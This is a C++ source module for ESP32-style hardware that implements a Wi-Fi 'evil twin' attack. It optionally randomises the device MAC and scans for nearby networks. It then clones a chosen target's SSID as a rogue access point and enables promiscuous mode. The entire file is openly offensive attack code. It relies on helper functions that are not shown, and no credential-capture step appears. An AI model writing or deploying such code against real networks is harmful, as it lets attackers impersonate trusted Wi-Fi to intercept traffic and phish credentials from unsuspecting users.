#include "WiFi.h"
#include "WiFiServer.h"
#include "esp_wifi.h"

#include "tool_state.h"
#include "wifi_common.h"
#include "display_common.h"

const char* selected_ssid;
uint8_t phase = 0;
int start_target_index = 0;
uint8_t target_bssid[6];
uint8_t target_count = static_cast<uint8_t>(scanned_network_count > MAX_NETWORKS ? MAX_NETWORKS : scanned_network_count);

bool stop_ap = false;

void _configure_attack_flags(bool random_mac){
    if (random_mac)
    {
        set_random_mac();
    }

}

void _launch_targeted_eviltwin(){
    int selected_target = select_target_network();
    
    if (selected_target < 0)
    {
        show_task_progress_frame("Target select canceled", 100, phase, false);
        delay(350);
        disable_wifi();
        return;
    }

    selected_ssid = networks[selected_target].ssid.c_str();

    Serial.print("Selected network: ");
    Serial.println(selected_ssid);

    if (create_ap(selected_ssid)){
        Serial.print("AP IP address: ");
        Serial.println(WiFi.localIP());
    };
    
    while (true)
    {
        if (is_menu_pressed || is_home_pressed || is_select_pressed || is_movefd_pressed || is_movebd_pressed)
        {
            break;
        }

        delay(200);
    }

    selected_ssid = "";

    disable_wifi();
}

void launch_eviltwin(const char *attack_type, bool random_mac, bool safe_mode){

    _configure_attack_flags(random_mac);

    init_wifi();
    scan_wifi("Scanning targets", safe_mode);
    
    if (scanned_network_count <= 0)
    {
        show_task_progress_frame("No target AP found", 100, 0, false);
        delay(450);
        disable_wifi();
        return;
    }

    esp_wifi_set_promiscuous(true);

    if (strcmp(attack_type, "targeted_eviltwin") == 0)
    {
        _launch_targeted_eviltwin();
    }

}